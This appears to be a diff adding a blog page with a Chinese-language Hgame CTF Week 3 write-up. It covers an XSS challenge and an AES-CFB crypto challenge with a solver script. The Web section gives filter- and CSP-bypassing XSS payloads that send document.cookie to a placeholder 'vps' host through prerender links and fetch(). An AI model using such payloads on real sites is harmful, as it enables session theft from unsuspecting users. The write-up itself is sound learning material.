@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <title> xᴊᴀsᴏɴʟʏᴜ | Hgame Week3 Writeup </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.69.2" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="ID = randint(0, 1) ? 12x : xjasonlyu">
+    <link rel="stylesheet" href="https://12x.me/css/style.css" type="text/css">
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <base href="https://12x.me">
+    
+    <link rel="shortcut icon" href="https://12x.me/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://12x.me/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://12x.me/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://12x.me/favicons/favicon-16x16.png">
+
+    <link rel="canonical" href="https://12x.me/post/hgame-week3-writeup/">
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://12x.me/images/profile.jpg" alt="profile picture" style="width:127px;border-radius: 50%;">
+        <h3 title=""><a href="/">I&#39;m Jason Lyu</a></h3>
+        <div class="description">
+          <p>ID = randint(0, 1) ? 12x : xjasonlyu</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <a href="https://twitter.com/xjasonlyu" rel="me" >
+          <i class="fa fa-twitter" aria-hidden="true" title="Twitter"></i>
+        </a>
+        
+        <a href="https://github.com/xjasonlyu" rel="me" >
+          <i class="fa fa-github" aria-hidden="true" title="GitHub"></i>
+        </a>
+        
+        <a href="mailto:this@12x.me" rel="me" >
+          <i class="fa fa-envelope" aria-hidden="true" title="e-mail"></i>
+        </a>
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; xᴊᴀsᴏɴʟʏᴜ 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <div class="nav">
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+
+        
+        <li><a  href="/post/" title="">Archive</a></li>
+
+        
+        <li><a  href="/about/" title="About">About</a></li>
+
+        
+    </div>
+</div>
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Hgame Week3 Writeup
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i><span class="date">Fri, Jan 31, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">2-minute read</span>
+        </div>
+        
+        </div>
+
+    <h2 id="hgame-week3-writeup">Hgame Week3 Writeup</h2>
+<p><img src="media/15792383134168/logo.png" alt="logo"></p>
+<p>这周不怎么想做题Orz，咕咕咕</p>
+<h3 id="0x00-web">0x00 Web</h3>
+<h4 id="cosmos的聊天室20">Cosmos的聊天室2.0</h4>
+<p>做了同源限制的CSP策略，刚开始没用Burp打开，就是找不到能上传js的点，后来才发现在<code>/send?message=</code>上。。
+测试一下<code>&lt;scscriptript src=&quot;/send？message=alert(123)&quot;&gt;&lt;/scscriptript&gt;</code>成功弹窗。
+这是第一步，成功绕过。
+第二步是怎么传回cookie，因为CSP所以不能直接访问外部URL。。
+试了用<code>link</code>标签的<code>prerender</code>来传，console里成功传回cookie，但是到<code>/send</code>会把所有字符小写导致报错（==）
+我原来的payload是</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">l</span><span style="color:#f92672">=</span>document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;link&#39;</span>);<span style="color:#a6e22e">l</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;rel&#39;</span>,<span style="color:#e6db74">&#39;prerender&#39;</span>);<span style="color:#a6e22e">l</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#39;href&#39;</span>,<span style="color:#e6db74">&#39;http://vps/?&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>);document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">l</span>);
+</code></pre></div><p>但是因为服务端会把所有字符小写，导致找不到<code>createelement</code>函数。。绝望的我就只能尽量选择全小写的函数了233
+然后我用。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;&lt;html&gt;&lt;head&gt;&lt;link rel=&#34;prerender&#34; href=&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;http://vps/?&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&gt;&lt;/head&gt;&lt;/html&gt;&#39;</span>)
+</code></pre></div><p>绕过了。。但是发现会不能提交到bot。。于是想到有jQuery，又构造成</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;head&#39;</span>).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#39;&lt;link rel=&#34;prerender&#34; href=&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;http://vps/?&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&gt;&#39;</span>)
+</code></pre></div><p>本地成功了，然后兴冲冲地提交到bot，结果没反应？？（可能是<code>prerender</code>的原因导致没有触发。。）
+那就只能用<code>preconnent</code>了啊。。但是要配合dns。。太绕了，算了，重新来。。
+可以知道只有根目录有csp，其他没有，那么就用object标签来伪造页面好了。。。
+重新构造Payload。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">scscscriptriptript</span>&gt;fetch(&#39;http://vps/?&#39;+document.cookie)&lt;/<span style="color:#f92672">scscscriptriptript</span>&gt;
+</code></pre></div><p>这里要三层<code>script</code>因为被send了两次=_=
+再把他urlencode一下生成最终的payload。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">object</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span> <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/send?message=%3Cscscscriptriptript%3Efetch%28%27http%3A//vps/%3F%27%2Bdocument.cookie%29%3C/scscscriptriptript%3E&#34;</span>&gt;&lt;/<span style="color:#f92672">object</span>&gt;
+</code></pre></div><p>提交，成功拿到cookie。。
+<img src="media/15804580147047/Screen%20Shot%202020-02-01%20at%208.29.59%20PM.png" alt="Screen Shot 2020-02-01 at 8.29.59 P-w940">
+Burp提交上去。。
+<img src="media/15804580147047/Screen%20Shot%202020-02-01%20at%208.30.39%20PM.png" alt="Screen Shot 2020-02-01 at 8.30.39 P-w1012">
+拿到flag。。（这周脑子坏了）</p>
+<h3 id="0x01-reverse">0x01 Reverse</h3>
+<h3 id="0x02-pwn">0x02 Pwn</h3>
+<h3 id="0x03-crypto">0x03 Crypto</h3>
+<h4 id="rsa">RSA?</h4>
+<h4 id="toycipher_xorshift">ToyCipher_XorShift</h4>
+<h4 id="exchange">Exchange</h4>
+<h4 id="feedback">Feedback</h4>
+<p>这题不难但是有点繁琐。。首先要知道CFB的工作模式
+<img src="media/15804580147047/1202px-CFB_encryption.svg.png" alt="1202px-CFB_encryption.svg-w601">
+<img src="media/15804580147047/1202px-CFB_decryption.svg.png" alt="1202px-CFB_decryption.svg-w601">
+所以这题我们虽然不能直接得到KEY和IV，但可以根据输入与输出的反馈，不断的求出每一次ciphertext和AES(KEY)加密后的结果（shift register）来与下一次的数据异或来求出每一段的原文（好绕啊，我自己都绕了好久。。）
+首先一次性是不可能拿到全flag的，只能拿到1/3个（16字节），至少要nc三次才能拿全。。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> pyaes
+<span style="color:#f92672">import</span> binascii
+<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+
+KEY <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">32</span>)
+IV <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
+MSG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">48</span>)
+
+xor <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x, y: bytes([ p <span style="color:#f92672">^</span> q <span style="color:#66d9ef">for</span> (p, q) <span style="color:#f92672">in</span> zip(x, y) ])
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(plaintext: bytes, seg<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>):
+    ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+    _shift <span style="color:#f92672">=</span> IV
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(plaintext), seg):
+        plaintext_seg <span style="color:#f92672">=</span> plaintext[i:i<span style="color:#f92672">+</span>seg]
+        blockcipher <span style="color:#f92672">=</span> pyaes<span style="color:#f92672">.</span>AES(KEY)<span style="color:#f92672">.</span>encrypt(_shift)
+        ciphertext_seg <span style="color:#f92672">=</span> xor(plaintext_seg, blockcipher)
+        _shift <span style="color:#f92672">=</span> ciphertext_seg
+        ciphertext <span style="color:#f92672">+=</span> ciphertext_seg
+    <span style="color:#66d9ef">return</span> ciphertext
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(ciphertext: bytes, seg<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>):
+    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+    _shift <span style="color:#f92672">=</span> IV
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ciphertext), seg):
+        ciphertext_seg <span style="color:#f92672">=</span> ciphertext[i:i<span style="color:#f92672">+</span>seg]
+        blockcipher <span style="color:#f92672">=</span> pyaes<span style="color:#f92672">.</span>AES(KEY)<span style="color:#f92672">.</span>encrypt(_shift)
+        plaintext_seg <span style="color:#f92672">=</span> xor(ciphertext_seg, blockcipher)
+        _shift <span style="color:#f92672">=</span> ciphertext_seg
+        plaintext <span style="color:#f92672">+=</span> plaintext_seg
+    <span style="color:#66d9ef">return</span> plaintext
+
+ciphertext <span style="color:#f92672">=</span> encrypt(MSG)
+<span style="color:#66d9ef">assert</span> ciphertext <span style="color:#f92672">==</span> AES<span style="color:#f92672">.</span>new(KEY, AES<span style="color:#f92672">.</span>MODE_CFB, IV, segment_size<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>)<span style="color:#f92672">.</span>encrypt(MSG)
+plaintext <span style="color:#f92672">=</span> decrypt(ciphertext)
+<span style="color:#66d9ef">assert</span> plaintext <span style="color:#f92672">==</span> AES<span style="color:#f92672">.</span>new(KEY, AES<span style="color:#f92672">.</span>MODE_CFB, IV, segment_size<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>)<span style="color:#f92672">.</span>decrypt(ciphertext)
+
+flag_1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;FLAG is hgame{51&#39;</span>
+flag_2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b72d4cd23b2fe672&#39;</span>
+flag_3 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+
+init_seg <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
+<span style="color:#75715e">## 0x00</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;*&#39;</span>, binascii<span style="color:#f92672">.</span>hexlify(init_seg)<span style="color:#f92672">.</span>decode())
+_の_text_1 <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(input(<span style="color:#e6db74">&#39;1: Round 1. output&gt; &#39;</span>)<span style="color:#f92672">.</span>encode())
+
+cipherblock_iv <span style="color:#f92672">=</span> xor(init_seg, _の_text_1)
+flag_enc_1 <span style="color:#f92672">=</span> xor(flag_1, cipherblock_iv)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;*&#39;</span>, binascii<span style="color:#f92672">.</span>hexlify(flag_enc_1<span style="color:#f92672">+</span>init_seg)<span style="color:#f92672">.</span>decode())
+_の_text_2 <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(input(<span style="color:#e6db74">&#39;1: Round 2. output&gt; &#39;</span>)<span style="color:#f92672">.</span>encode())
+
+cipherblock_c1 <span style="color:#f92672">=</span> xor(init_seg, _の_text_2[<span style="color:#ae81ff">16</span>:])
+flag_enc_2 <span style="color:#f92672">=</span> xor(flag_2, cipherblock_c1)
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;*&#39;</span>, binascii<span style="color:#f92672">.</span>hexlify(flag_enc_1<span style="color:#f92672">+</span>flag_enc_2<span style="color:#f92672">+</span>init_seg)<span style="color:#f92672">.</span>decode())
+_の_text_3 <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(input(<span style="color:#e6db74">&#39;1: Round 3. output&gt; &#39;</span>)<span style="color:#f92672">.</span>encode())
+
+cipherblock_c2 <span style="color:#f92672">=</span> xor(init_seg, _の_text_3[<span style="color:#ae81ff">32</span>:])
+
+flag_enc_3 <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(input(<span style="color:#e6db74">&#39;Flag. output&gt; &#39;</span>)<span style="color:#f92672">.</span>encode())[<span style="color:#ae81ff">32</span>:]
+flag_3 <span style="color:#f92672">=</span> xor(cipherblock_c2, flag_enc_3) <span style="color:#75715e">#</span>
+
+flag <span style="color:#f92672">=</span> flag_1 <span style="color:#f92672">+</span> flag_2 <span style="color:#f92672">+</span>flag_3
+<span style="color:#66d9ef">print</span>(flag)
+</code></pre></div><p>我的试验脚本（有点乱，不管了），已经知道了前两段的flag，这是求第三段的。
+<img src="media/15804580147047/Screen%20Shot%202020-01-31%20at%208.11.42%20PM.png" alt="Screen Shot 2020-01-31 at 8.11.42 P-w920">
+<img src="media/15804580147047/Screen%20Shot%202020-01-31%20at%208.11.32%20PM.png" alt="Screen Shot 2020-01-31 at 8.11.32 P-w566">
+拿到flag</p>
+<h3 id="0x04-misc">0x04 Misc</h3>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+    <span class="separator"><a class="tag" href="/tags/ctf/">CTF</a><a class="tag" href="/tags/hgame/">Hgame</a></span>
+
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+<script type="text/javascript" src="https://12x.me/js/jquery.min.js"></script>
+<script type="text/javascript" src="https://12x.me/js/jquery-migrate.min.js"></script>
+<script type="text/javascript" src="https://12x.me/js/jquery-appear.min.js"></script></html></body>
+
+</html>
